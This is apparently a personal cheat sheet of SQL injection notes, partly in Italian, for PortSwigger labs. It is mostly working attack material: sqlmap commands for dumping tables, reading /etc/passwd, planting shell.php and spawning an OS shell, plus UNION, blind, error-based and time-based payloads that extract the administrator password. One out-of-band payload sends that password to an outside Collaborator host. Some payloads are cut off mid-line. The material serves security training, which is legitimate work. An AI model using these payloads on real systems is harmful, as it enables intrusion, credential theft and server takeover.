

```
### SQL Injection - Vulnerabilities


# SQL Injection - In-Band SQLi
- Error Based SQLi
- Union Based SQLi



# SQL Injection - Blind SQLi:
Molte istanze di SQL injection sono vulnerabilità cieche. Ciò significa che l'applicazione non restituisce i risultati della query SQL o i dettagli di eventuali errori del database all'interno delle sue risposte. Le vulnerabilità cieche possono ancora essere sfruttate per accedere a dati non autorizzati, ma le tecniche coinvolte sono generalmente più complicate e difficili da eseguire. 

- Boolean Based SQLi
- Time Based SQLi



# SQL Injection - Out-Of-Band SQLi

```

```
### SQL Injection - SQLMAP:

#. View the basic help menu:
> sqlmap -h

#. View the advanced help menu:
> sqlmap -hh

#. Run SQLMap without asking for user input:
> sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	

#. SQLMap with POST request
> sqlmap 'http://www.example.com/' --data 'uid=1&name=test'	

#. POST request specifying an injection point with an asterisk:
> sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

#. Passing an HTTP request file to SQLMap
> sqlmap -r req.txt	Passing an HTTP request file to SQLMap

#. Specifying a cookie header:
> sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

#. Specifying a PUT request:
> sqlmap -u www.target.com --data='id=1' --method PUT	

#. Store traffic to an output file:
> sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	

#. Specify verbosity level:
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

#. Specifying a prefix or suffix:
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

#. Specifying the level and risk:
sqlmap -u www.example.com/?id=1 -v 3 --level=5

#. Basic DB enumeration:
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	

#.Table enumeration:
> sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

#. Table/row enumeration:
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

#. Conditional enumeration:
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

#. Database schema enumeration:
sqlmap -u "http://www.example.com/?id=1" --schema

#. Searching for data:
sqlmap -u "http://www.example.com/?id=1" --search -T user

#. Password enumeration and cracking:
sqlmap -u "http://www.example.com/?id=1" --passwords --batch

#. Anti-CSRF token bypass:
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	

#. List all tamper scripts:
sqlmap --list-tampers

#. Check for DBA privileges:
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

#. Reading a local file:
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

#. Writing a file:
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

#. Spawning an OS shell
sqlmap -u "http://www.example.com/?id=1" --os-shell	

```

```
### SQL Injection - General

# PortSwigger - CleanSheet:
> https://portswigger.net/web-security/sql-injection/cheat-sheet


Oracle 	   -> dbms_pipe.receive_message(('a'),10)
Microsoft  -> WAITFOR DELAY '0:0:10'
PostgreSQL -> SELECT pg_sleep(10)
MySQL 	   -> SELECT SLEEP(10)


Oracle - Time Based:
> 1'AND+3=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74),10)--
> ?category=Gifts'+OR+1=1--
> username = 'administrator'--' AND password =
```

```
### SQL Injection - Lab Apprentice

#1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
'+OR+1=1--


#2. Lab: SQL injection vulnerability allowing login bypass
> Modify the username parameter, giving it the value: administrator'-- 

```

```
### SQL Injection - Lab Practitioner




#3. Lab: SQL injection attack, querying the database type and version on Oracle
> Determine the number of columns of "category parameter": '+UNION+SELECT+'abc','def'+FROM+dual--
> '+UNION+SELECT+BANNER,+NULL+FROM+v$version--



#4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
> Determine the number of columns with '+UNION+SELECT+'abc','def'#
> Display database version: "'+UNION+SELECT+@@version,+NULL#"



#5. Lab: SQL injection attack, listing the database contents on non-Oracle databases
> Determine the number of columns: "'+UNION+SELECT+'abc','def'--"
> Use the following payload to retrieve the list of tables in the database:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
>  Use the following payload to retrieve the details of the columns in the table: 
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
> Use the following payload to retrieve the usernames and passwords for all users:
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--



#6. Lab: SQL injection attack, listing the database contents on Oracle
> Determine the number of columns: "'+UNION+SELECT+'abc','def'+FROM+dual--"
> Retrieve list of tables in the DB: "'+UNION+SELECT+table_name,NULL+FROM+all_tables--"
> Retrieve list of columns: "'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--"
> Retrieve username and password '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--



#7. Lab: SQL injection UNION attack, determining the number of columns returned by the query
> Category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
>   Modify the category parameter to add an additional column containing a null value:
'+UNION+SELECT+NULL,NULL-



#8. Lab: SQL injection UNION attack, finding a column containing text
> '+UNION+SELECT+NULL,NULL,NULL--
> '+UNION+SELECT+'abcdef',NULL,NULL--
>  If an error occurs, move on to the next null and try that instead. 



#9. Lab: SQL injection UNION attack, retrieving data from other tables
> Determine number of columns "'+UNION+SELECT+'abc','def'--"
> Retrieve contents of the users table: '+UNION+SELECT+username,+password+FROM+users--




#10. Lab: SQL injection UNION attack, retrieving multiple values in a single column:
> Determine nubmer of columns "'+UNION+SELECT+NULL,'abc'--"
> Retrieve contents of the users table '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



#11. Blind SQL injection with conditional responses
>  Modify the TrackingId cookie, changing it to:
TrackingId=xyz' AND '1'='1
> TrackingId=xyz' AND '1'='2
> TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
> TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
> TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
> TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
> TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
> TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
> TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
> TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a



#12. Lab: Blind SQL injection with conditional errors
> TrackingId=xyz'
> TrackingId=xyz''
> TrackingId=xyz'||(SELECT '')||'
> TrackingId=xyz'||(SELECT '' FROM dual)||'
> Verify is a table exists:  TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||' 
> TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
> TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'



#13. Lab: Visible error-based SQL injection
> TrackingId=ogAZZfxtOKUELbuJ'
In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.

> In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
TrackingId=ogAZZfxtOKUELbuJ'--
Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.

> Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
Send the request. Observe that you now get a different error saying that an AND condition must be a boolean expression.

> Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.

> Adapt your generic SELECT statement so that it retrieves usernames from the database:
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.

> Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.

> Modify the query to return only one row:
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

> Send the request. Observe that the error message now leaks the first username from the users table:
ERROR: invalid input syntax for type integer: "administrator"

> Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS i



#14. Lab: Blind SQL injection with time delays
> TrackingId=x'||pg_sleep(10)--



#15. Lab: Blind SQL injection with time delays and information retrieval
> Modify the TrackingId cookie, changing it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

> Verify that the application takes 10 seconds to respond.

> Now change it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

> Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

> Now change it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

> Verify that the condition is true, confirming that there is a user called administrator.

> The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

> This condition should be true, confirming that the password is greater than 1 character in length.

> Send a series of follow-up values to test different password lengths. Send:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

> Then send:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

> And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

> In the Positions tab of Burp Intruder, change the value of the cookie to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

> This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

> Place payload position markers around the a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload settings" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to 1.
Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".
Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.

> Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
Launch the modified attack, review the results, and note the character at the second offset.
Continue this process testing offset 3, 4, and so on, until you have the whole password.
In the browser, click "My account" to open the login page. Use the password to log in as the administrator user. 



#16. Lab: Blind SQL injection with out-of-band interaction
> TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--



#17. Lab: Blind SQL injection with out-of-band data exfiltration
> TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--




#18. Lab: SQL injection with filter bypass via XML encoding
> POST /product/stock
<storeId>1+1</storeId>

> <storeId>1 UNION SELECT NULL</storeId>

> Bypass the WAF
As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.

> <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>


```

```
### SQL Injection -  Lab Expert
```

```
### SQL Injection - Lab Extra
```